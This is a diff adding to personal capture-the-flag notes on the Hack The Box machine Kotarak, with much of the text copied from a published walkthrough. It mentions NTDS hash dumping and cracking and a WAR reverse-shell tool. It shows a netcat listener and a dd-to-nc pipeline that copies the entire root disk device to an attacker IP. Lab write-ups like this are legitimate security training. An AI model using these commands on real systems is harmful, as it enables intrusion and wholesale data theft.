@@ -7,7 +7,10 @@
 #Up0load .NTDS and .bin files
 #Use of impacket-secretdump to dump the HASHES
 #NTLM Hash Crach hashcat hashes rockyou.txt -m 1000
-
+#WAR File Reverse shell: https://github.com/thewhiteh4t/warsend
+#Linux priv esc: https://docs.h4rithd.com/linux/privilageesc-linux
+#Root via Disk unzip and mount
+# https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#alternative-root-via-disk
 #
 
 1-Enumeration:
@@ -218,6 +221,90 @@
 
     Here we fin a depreciated version of "Wget" that is runing every 2 minutes.
             Wget/1.16 
+
+
+    We can try some Linux Priv Esc:
+        https://docs.h4rithd.com/linux/privilageesc-linux
+
+
+    Request: https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html
+
+    Need some way to listen on port 80 on this host:
+
+    authbind is a program that allows non-root users to bind on low ports.
+
+    With authbind, I’m able to listen on port 80 without issue:
+
+        atanas@kotarak-dmz:/$ which authbind
+            which authbind
+            /usr/bin/authbind
+
+    authbind is a program that allows non-root users to bind on low ports.
+    With authbind, I’m able to listen on port 80 without issue:
+        atanas@kotarak-dmz:/$ authbind nc -lvnp 80  
+            authbind nc -lvnp 80
+            Listening on [0.0.0.0] (family 0, port 80)
+
+    Request
+        I’ll use nc so I can see what a full request looks like if it comes.
+
+        atanas@kotarak-dmz:/$ authbind nc -lvnp 80  
+            authbind nc -lvnp 80
+            Listening on [0.0.0.0] (family 0, port 80)
+            Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 54668)
+            GET /archive.tar.gz HTTP/1.1
+            User-Agent: Wget/1.16 (linux-gnu)
+            Accept: */*
+            Host: 10.0.3.1
+            Connection: Keep-Alive
+
+    Root by DIsk:
+        I actually found this root before finding the intended path. The first thing I check when I get a shell is the groups the user is in with the id command:
+
+        atanas@kotarak-dmz:/$ id
+            id
+            uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)
+
+        atanas is in the disk group, which gives access to the raw devices.
+            lsblk shows how the devices are configured: 
+                atanas@kotarak-dmz:/$ lsblk
+                    lsblk
+                    NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+                    sda                      8:0    0   12G  0 disk 
+                    ├─sda1                   8:1    0  120M  0 part /boot
+                    ├─sda2                   8:2    0    1K  0 part 
+                    └─sda5                   8:5    0 11.9G  0 part 
+                    ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
+                    └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
+                    sr0                     11:0    1 1024M  0 rom  
+
+        Kotarak--vg-root and Kotarak--vg-swap_1 are the root file system and swap space under LVM. Both live on the sda5 partition on sda. The LVM mappings live in /dev/mapper:
+            atanas@kotarak-dmz:/$ ls -l /dev/mapper/
+                ls -l /dev/mapper/
+                total 0
+                crw------- 1 root root 10, 236 Jan 23 13:37 control
+                lrwxrwxrwx 1 root root       7 Jan 23 13:37 Kotarak--vg-root -> ../dm-0
+                lrwxrwxrwx 1 root root       7 Jan 23 13:37 Kotarak--vg-swap_1 -> ../dm-1
+        
+        "dm-0" is the device I want to read off to get the root of the filesystem.  
+
+
+        Exfil Filesystem
+        I’ll use dd to read from the device, and nc to copy the entire filesystem off the device back to my host. I’ll send it through gzip to compress it so that it will move faster
+
+        1- ╼ [★]$ sudo nc -lnvp 4443 > dm-0.gz
+
+        2-  atanas@kotarak-dmz:/$ time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.124 4443
+            time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.124 4443
+
+        3- └──╼ [★]$ ls -lh dm-0.gz
+                    -rw-r--r-- 1 dsk75 dsk75 2.2G Jan 23 15:31 dm-0.gz
+
+            ─╼ [★]$ sudo mount dm-0-orig /mnt/
+                    ls /mnt/
+                    ls /mnt/root/
+                    sudo cat /mnt/var/lib/lxc/kotarak-int/rootfs/root/root.txt
+
 
 
 
